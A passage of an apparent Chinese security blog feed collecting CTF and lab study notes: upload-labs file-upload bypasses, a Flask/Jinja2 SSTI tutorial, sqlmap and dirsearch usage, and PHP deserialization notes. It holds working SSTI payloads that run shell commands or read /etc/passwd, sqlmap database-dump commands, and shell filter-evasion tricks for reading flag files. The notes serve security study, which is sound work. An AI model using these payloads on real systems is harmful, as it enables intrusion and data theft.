id="pass-19">Pass-19</h1><ul><li>提示：取文件名通过$_POST来获取</li><li>绕过方法：<ul><li>move_uploaded_file()特性，会忽略掉文件末尾的/.，构造<code>upload-19.php/.</code></li><li>00截断</li></ul></li></ul><h1 id="pass-20">Pass-20</h1><ul><li>提示：审计代码</li><li>绕过方法：构造数组</li><li>验证过程：<ul><li>验证上传路径是否存在</li><li>验证['upload_file']的content-type是否合法（可以抓包修改）</li><li>判断POST参数是否为空定义file变量（关键：构造数组绕过下一步的判断）</li><li>判断file不是数组则使用<code>explode('.', strtolower($file))</code>对file进行切割，将file变为一个数组</li><li>判断数组最后一个元素是否合法</li><li>数组第一位和<code>$file[count($file) - 1]</code>进行拼接，产生保存文件名file_name</li><li>上传文件</li></ul></li></ul><p>参考教程：</p><ol type="1"><li><ahref="https://www.cnblogs.com/chu-jian/p/15515770.html">upload-labs通关攻略（全）- 清茶先生 - 博客园 (cnblogs.com)</a></li><li><ahref="https://blog.csdn.net/weixin_47598409/article/details/115050869">【精选】Upload-labs1-21关 靶场通关攻略(全网最全最完整)_upload靶场-CSDN博客</a></li><li><ahref="https://blog.csdn.net/weixin_45588247/article/details/119177948">【精选】【文件上传绕过】——二次渲染漏洞_二次渲染绕过-CSDN博客</a></li><li><ahref="https://note.youdao.com/ynoteshare/index.html?id=c38d0024e15fd3edf7a7dfbf9d0aecd0&amp;type=note&amp;_time=1689208551643">有道云笔记(youdao.com)</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>安全服务</category>
      
      <category>Web渗透</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>模板注入</title>
    <link href="/2023/10/19/%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1/Web%E6%B8%97%E9%80%8F/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"/>
    <url>/2023/10/19/%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1/Web%E6%B8%97%E9%80%8F/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="flask基础">1 flask基础</h1><p><strong>路由</strong>：route装饰器的作用是将函数与url绑定起来。例子中的代码的作用就是当你访问http://127.0.0.1:5000/index的时候，flask会返回helloword。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> flask <br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/index/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hello_word</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;hello word&#x27;</span><br></code></pre></td></tr></table></figure><p><strong>渲染方法：</strong></p><p>render_template()：用来渲染一个指定的文件。</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">return</span> <span class="hljs-function"><span class="hljs-title">render_template</span>(<span class="hljs-string">&#x27;index.html&#x27;</span>)</span><br></code></pre></td></tr></table></figure><p>render_template_string()：用来渲染一个字符串。SSTI与这个方法密不可分</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">html</span> = <span class="hljs-string">&#x27;&lt;h1&gt;This is index page&lt;/h1&gt;&#x27;</span><br><span class="hljs-variable">return</span> <span class="hljs-function"><span class="hljs-title">render_template_string</span>(<span class="hljs-variable">html</span>)</span><br></code></pre></td></tr></table></figure><p><strong>模板：</strong></p><p>flask是使用Jinja2来作为渲染引擎的。在网站的根目录下新建<code>templates</code>文件夹，这里是用来存放html文件，也就是模板文件。</p><h1 id="ssti文件读取命令执行">2 SSTI文件读取/命令执行</h1><p><strong>定义：</strong>SSTI 就是服务器端模板注入（Server-SideTemplate Injection）</p><p><strong>基础知识</strong>：在Jinja2模板引擎中，<code>&#123;&#123;&#125;&#125;</code>是变量包裹标识符。<code>&#123;&#123;&#125;&#125;</code>并不仅仅可以传递变量，还可以执行一些简单的表达式。</p><p><strong>实现思路</strong>：通过python的对象的继承来一步步实现文件读取和命令执行。找到父类&lt;type'object'&gt;--&gt;寻找子类--&gt;找关于命令执行或者文件操作的模块。</p><p><strong>几个魔术方法</strong></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-strong">__class__</span>  返回类型所属的对象<br><span class="hljs-strong">__mro__</span>    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。<br><span class="hljs-strong">__base__</span>   返回该对象所继承的基类<br>// <span class="hljs-strong">__base__</span>和<span class="hljs-strong">__mro__</span>都是用来寻找基类的<br><br><span class="hljs-strong">__subclasses__</span>   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表<br><span class="hljs-strong">__init__</span>  类的初始化方法<br><span class="hljs-strong">__globals__</span>  对包含函数全局变量的字典的引用<br></code></pre></td></tr></table></figure><p>1 、获取字符串的类对象</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&#x27;&#x27;</span>.__class__<br>&lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;str&#x27;</span>&gt;<br></code></pre></td></tr></table></figure><p>2 、寻找基类</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sqf">&gt;&gt;&gt; <span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__mro__</span><br>(&lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;str&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;basestring&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;object&#x27;</span>&gt;)<br></code></pre></td></tr></table></figure><p>3 、寻找可用引用</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqf">&gt;&gt;&gt; <span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__mro__</span>[<span class="hljs-number">2</span>].<span class="hljs-variable">__subclasses__</span>()<br></code></pre></td></tr></table></figure><p>4、进行利用</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">type</span> &#x27;<span class="hljs-attr">file</span>&#x27;&gt;</span>类型(可以进行文件读取)</span><br><span class="language-xml"># python调用Shell脚本，有两种方法：os.system()和os.popen(),</span><br><span class="language-xml"># 前者返回值是脚本的 退出状态码，后者的返回值是脚本执行过程中的 输出内容</span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">class</span> ‘<span class="hljs-attr">site._Printer</span>’&gt;</span>类型（可以进行命令执行）</span><br><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.__mro__</span>[2].__subclasses__()[71].__init__.__globals__[&#x27;os&#x27;].listdir(<span class="hljs-name">&#x27;.&#x27;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">--&gt;URL http://61.147.171.105:56698/[&#x27;index.py&#x27;, &#x27;fl4g&#x27;] not found</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.__mro__</span>[2].__subclasses__()[40](<span class="hljs-name">&#x27;fl4g&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">--&gt;URL http://61.147.171.105:56698/ctf&#123;f22b6844-5169-4054-b2a0-d95b9361cb57&#125; not found</span><br></code></pre></td></tr></table></figure><p><strong>常用payload：</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__<span class="hljs-selector-attr">[2]</span>.<span class="hljs-built_in">__subclasses__</span>()<span class="hljs-selector-attr">[71]</span>.__init__.__globals__<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;os&#x27;</span>]</span><span class="hljs-selector-class">.popen</span>(<span class="hljs-string">&#x27;cat fl4g&#x27;</span>)<span class="hljs-selector-class">.read</span>()<br><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__<span class="hljs-selector-attr">[2]</span>.<span class="hljs-built_in">__subclasses__</span>()<span class="hljs-selector-attr">[71]</span>.__init__.__globals__<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;os&#x27;</span>]</span><span class="hljs-selector-class">.system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>)<br><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__<span class="hljs-selector-attr">[2]</span>.<span class="hljs-built_in">__subclasses__</span>()<span class="hljs-selector-attr">[40]</span>(<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>)<span class="hljs-selector-class">.read</span>()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>安全服务</category>
      
      <category>Web渗透</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>sqlmap</title>
    <link href="/2023/10/19/%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/sqlmap/"/>
    <url>/2023/10/19/%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/sqlmap/</url>
    
    <content type="html"><![CDATA[<h1 id="介绍">0. 介绍</h1><ul><li>SQLMAP是一个开源的自动化SQL注入工具，其主要功能是扫描、发现并利用给定的URL的SQL注入漏洞。</li><li>SQLMAP的基本功能包括：判断可注入的参数、判断可以使用哪一种SQL注入技术进行注入、判断识别数据库的类型以及根据用户的选择从数据库中读取数据。</li><li>SQLMAP支持的注入技术包括以下五种：<ul><li>基于布尔的盲注：根据返回页面判断条件真假的注入。</li><li>基于时间的盲注：不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。</li><li>基于报错的注入：页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。</li><li>基于联合查询的注入：可以使用UNION的情况下的注入。</li><li>堆查询注入：同时执行多条语句的注入。</li></ul></li><li>SQLMAP支持的数据库类型主要包括一些关系型数据库（RMDBS），如MySQL、Oracle、PostgreSQL、MicrosoftSQL Server、Microsoft Access、IBM DB2、SQLite、Firebird、Sybase、SAPMaxDB、Informix、HSQLDB等。</li></ul><h1 id="常用参数">1. 常用参数</h1><ul><li><p>-r:以递归方式扫描指定目录下的所有文件（文件中包含<strong>http请求</strong>）。</p></li><li><p>-u :连接目标网站并进行扫描。</p></li><li><p>-m:从文件中取出保存的<strong>url</strong>进行检测。</p></li><li><p>-dbs：列出数据库的名称。</p></li><li><p>--tables：列出数据库中的所有表。</p></li><li><p>--columns：列出指定表中的所有列。</p></li><li><p>--dump：导出指定表中的数据。</p></li></ul><h1 id="get注入">2. GET注入</h1><ol type="1"><li><p>监测是否存在注入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">sqlmap -u <span class="hljs-string">&quot;http://xxxx/?id=1&quot;</span><br></code></pre></td></tr></table></figure></li><li><p>获取数据库名称</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">sqlmap <span class="hljs-operator">-</span>u &quot;http://xxxx/?id=1&quot; <span class="hljs-operator">-</span>dbs<br></code></pre></td></tr></table></figure></li><li><p>获取表名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">sqlmap <span class="hljs-operator">-</span>u &quot;http://xxxx/?id=1&quot; <span class="hljs-operator">-</span>D xxxx <span class="hljs-comment">--tables</span><br></code></pre></td></tr></table></figure></li><li><p>获取列名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">sqlmap <span class="hljs-operator">-</span>u &quot;http://xxxx/?id=1&quot; <span class="hljs-operator">-</span>D xxxx <span class="hljs-operator">-</span>T xxxx <span class="hljs-comment">--columns</span><br></code></pre></td></tr></table></figure></li><li><p>获取字段内容</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">sqlmap -u <span class="hljs-string">&quot;http://xxxx/?id=1&quot;</span> -D xxxx -T xxxx -C xxxx(逗号隔开) --<span class="hljs-keyword">dump</span><br></code></pre></td></tr></table></figure></li></ol><h1 id="post注入">3. POST注入</h1><p>1.获取注入点</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">sqlmap -u http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">100.161</span>:<span class="hljs-number">53459</span> --data <span class="hljs-string">&quot;search=df&quot;</span><br></code></pre></td></tr></table></figure><p>2.获取数据库信息</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">sqlmap -u http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">100.161</span>:<span class="hljs-number">53459</span> --data <span class="hljs-string">&quot;search=df&quot;</span> -dbs<br></code></pre></td></tr></table></figure><p>3.获取库内表信息</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">sqlmap -u http:<span class="hljs-string">//192.168.100.161</span><span class="hljs-function">:53459</span> <span class="hljs-params">--data</span> <span class="hljs-string">&quot;search=df&quot;</span> -D news <span class="hljs-params">--tables</span><br></code></pre></td></tr></table></figure><p>4.获取表内字段信息</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">sqlmap -u http:<span class="hljs-string">//192.168.100.161</span><span class="hljs-function">:53459</span> <span class="hljs-params">--data</span> <span class="hljs-string">&quot;search=df&quot;</span> -D news -T secret_table <span class="hljs-params">--columns</span><br></code></pre></td></tr></table></figure><p>5.获取字段内容，得到flag</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">sqlmap -u http:<span class="hljs-string">//192.168.100.161</span><span class="hljs-function">:53459</span> <span class="hljs-params">--data</span> <span class="hljs-string">&quot;search=df&quot;</span> -D news -T secret_table -C <span class="hljs-string">&quot;fl4g&quot;</span> <span class="hljs-params">--dump</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>安全服务</category>
      
      <category>渗透测试工具</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>dirsearch</title>
    <link href="/2023/10/18/%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/dirsearch/"/>
    <url>/2023/10/18/%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/dirsearch/</url>
    
    <content type="html"><![CDATA[<h1 id="常见用法">常见用法</h1><ul><li>dirsearch -u https://xxxx 扫描某个站点</li><li>dirsearch -u https://xxxx -r 递归扫描</li><li>dirsearch -u https://xxxx -r -t 30 线程控制请求速率扫描</li><li>dirsearch -u https://xxxx -r -t 30 --proxy 127.0.0.1:8080使用代理进行扫描</li></ul>]]></content>
    
    
    <categories>
      
      <category>安全服务</category>
      
      <category>渗透测试工具</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>PHP序列化和反序列化</title>
    <link href="/2023/10/18/%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1/Web%E6%B8%97%E9%80%8F/PHP%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2023/10/18/%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1/Web%E6%B8%97%E9%80%8F/PHP%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="序列化">1 序列化</h1><p>概念：在PHP中，序列化用于存储或传递 PHP的值的过程中，同时不丢失其类型和结构。</p><p>当调用<code>serialize()</code>函数序列化对象时，该函数会检查类中是否存在一个魔术方法<code>__sleep()</code>。如果存在，该方法会先被调用，然后才执行序列化操作。可以通过重载这个方法，从而自定义序列化行为。</p><p>public：属性被序列化的时候属性名会变成 <code>属性名</code></p><p>protected：属性被序列化的时候属性名会变成<code>\x00*\x00属性名</code></p><p>private：属性被序列化的时候属性名会变成<code>\x00类名\x00属性名</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">People</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$id</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$gender</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$age</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;id = <span class="hljs-string">&#x27;WuFei666&#x27;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;gender = <span class="hljs-string">&#x27;male&#x27;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;age = <span class="hljs-string">&#x27;18&#x27;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">People</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br>    <br><span class="hljs-comment">//输出结果</span><br>O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;People&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;id&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;WuFei666&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot; * gender&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;male&quot;</span>;s:<span class="hljs-number">11</span>:<span class="hljs-string">&quot; People age&quot;</span>;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;18&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>序列化对于不同类型得到的字符串格式：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$number</span> = <span class="hljs-number">34</span>;<br><span class="hljs-variable">$str</span> = <span class="hljs-string">&#x27;uusama&#x27;</span>;<br><span class="hljs-variable">$bool</span> = <span class="hljs-literal">true</span>;<br><span class="hljs-variable">$null</span> = <span class="hljs-literal">NULL</span>;<br><span class="hljs-variable">$arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;a&#x27;</span> =&gt; <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;b&#x27;</span> =&gt; <span class="hljs-number">2</span>);<br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$number</span>));<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$str</span>));<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$bool</span>));<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$null</span>));<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$arr</span>));<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//输出结果</span><br><span class="hljs-keyword">string</span>(<span class="hljs-number">5</span>) <span class="hljs-string">&quot;i:34;&quot;</span><br><span class="hljs-keyword">string</span>(<span class="hljs-number">13</span>) <span class="hljs-string">&quot;s:6:&quot;</span>uusama<span class="hljs-string">&quot;;&quot;</span><br><span class="hljs-keyword">string</span>(<span class="hljs-number">4</span>) <span class="hljs-string">&quot;b:1;&quot;</span><br><span class="hljs-keyword">string</span>(<span class="hljs-number">2</span>) <span class="hljs-string">&quot;N;&quot;</span><br><span class="hljs-keyword">string</span>(<span class="hljs-number">30</span>) <span class="hljs-string">&quot;a:2:&#123;s:1:&quot;</span>a<span class="hljs-string">&quot;;i:1;s:1:&quot;</span>b<span class="hljs-string">&quot;;i:2;&#125;&quot;</span><br></code></pre></td></tr></table></figure><h1 id="反序列化">2 反序列化</h1><p>概念：把序列化后的字符串恢复原样</p><p>若被反序列化的变量是一个对象，在成功重新构造对象之后，PHP会自动地试图去调用<code>__wakeup()</code>成员函数（如果存在的话）</p><p><code>__wakeup()</code>函数<strong>漏洞原理</strong>：当序列化字符串表示对象属性个数的值<strong>大于</strong>真实个数的属性时就会跳过<code>__wakeup()</code>的执行</p><p><strong>php的魔术方法</strong></p><ul><li>__construct() 当一个对象创建时被调用 –构造函数</li><li>__destruct() 当一个对象销毁时被调用 –析构函数</li><li>__wakeup() 使用unserialize时触发</li><li>__sleep() 使用serialize时触发</li><li>__toString() 当一个对象被当做一个字符串时来使用</li></ul><p><strong>序列化到反序列化这几个函数的执行过程：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">__construct</span>()` -&gt;`<span class="hljs-title function_ invoke__">__sleep</span>()` -&gt; `<span class="hljs-title function_ invoke__">__wakeup</span>()` -&gt; `<span class="hljs-title function_ invoke__">__toString</span>()` -&gt; `<span class="hljs-title function_ invoke__">__destruct</span>()<br></code></pre></td></tr></table></figure><h1 id="call_user_func_array">3 call_user_func_array</h1><p>作用：调用回调函数，并把一个数组参数作为回调函数的参数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># 普通使用：</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">a</span>(<span class="hljs-params"><span class="hljs-variable">$b</span>, <span class="hljs-variable">$c</span></span>) </span><br><span class="hljs-function"></span>&#123;  <br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>; <br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$c</span>; <br>&#125; <br><span class="hljs-title function_ invoke__">call_user_func_array</span>(<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;111&quot;</span>, <span class="hljs-string">&quot;222&quot;</span>)); <br><span class="hljs-comment">//输出 111 222</span><br><br><span class="hljs-comment"># 调用类内部的方法：</span><br>Class ClassA <br>&#123; <br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">bc</span>(<span class="hljs-params"><span class="hljs-variable">$b</span>, <span class="hljs-variable">$c</span></span>)</span><br><span class="hljs-function"></span>&#123; <br><span class="hljs-variable">$bc</span> = <span class="hljs-variable">$b</span> + <span class="hljs-variable">$c</span>; <br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$bc</span>; <br>&#125; <br>&#125; <br><span class="hljs-title function_ invoke__">call_user_func_array</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;ClassA&#x27;</span>,<span class="hljs-string">&#x27;bc&#x27;</span>), <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;111&quot;</span>, <span class="hljs-string">&quot;222&quot;</span>)); <br><span class="hljs-comment">//输出  333 </span><br></code></pre></td></tr></table></figure><h1 id="绕过正则过滤">4 绕过正则过滤</h1><ul><li><p>反斜线<code>\</code>绕过</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>l\s<br></code></pre></td></tr></table></figure></li><li><p><code>$&#123;IFS&#125;</code>,<code>$IFS</code>代替空格</p></li><li><p>引号绕过</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell">//如<span class="hljs-built_in">cat</span>、<span class="hljs-built_in">ls</span>被过滤<br><span class="hljs-variable">$</span> ca<span class="hljs-string">&quot;&quot;</span>t /flag<br><span class="hljs-variable">$</span> l<span class="hljs-string">&#x27;s&#x27;</span> /<br></code></pre></td></tr></table></figure></li><li><p>拼接法</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> a=<span class="hljs-built_in">fl</span>;b=ag;<span class="hljs-built_in">cat</span><span class="hljs-variable">$IFS</span><span class="hljs-variable">$a</span><span class="hljs-variable">$b</span><br></code></pre></td></tr></table></figure></li><li><p>八进制编码和十六进制编码绕过</p><ul><li>比如：<code>/</code>的八进制编码为\57，那么使用<code>$(printf$&#123;IFS&#125;”\57”)</code>内敛执行输出“/”到字符串中。</li></ul></li><li><p>cat的替换命令</p><table><thead><tr class="header"><th>命令</th><th>描述</th></tr></thead><tbody><tr class="odd"><td>tac</td><td>与cat相反，按行反向输出</td></tr><tr class="even"><td>more</td><td>按页显示，用于文件内容较多且不能滚动屏幕时查看文件</td></tr><tr class="odd"><td>less</td><td>与more类似</td></tr><tr class="even"><td>tail</td><td>查看文件末几行</td></tr><tr class="odd"><td>head</td><td>查看文件首几行</td></tr></tbody></table></li><li><p><code>/[oc]:\d+:/i</code>：匹配的是 O:4，我们用 O:+4即可绕过</p></li></ul><p>参考教程：</p><ol type="1"><li><ahref="https://www.cnblogs.com/youyoui/p/8610068.html">深度剖析PHP序列化和反序列化- 悠悠i - 博客园 (cnblogs.com)</a></li><li><ahref="https://jiashi19.gitee.io/2023/09/18/ctf-web-php/">ctf-web练习(php)- Blog from js19 (gitee.io)</a></li><li><ahref="https://blog.csdn.net/weihuiblog/article/details/78998924">call_user_func_array函数详解-CSDN博客</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>安全服务</category>
      
      <category>Web渗透</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Shellcode Development</title>
    <link href="/2023/10/17/SEED-LABS/Software%20Security/Shellcode%20Development/"/>
    <url>/2023/10/17/SEED-LABS/Software%20Security/Shellcode%20Development/</url>
    
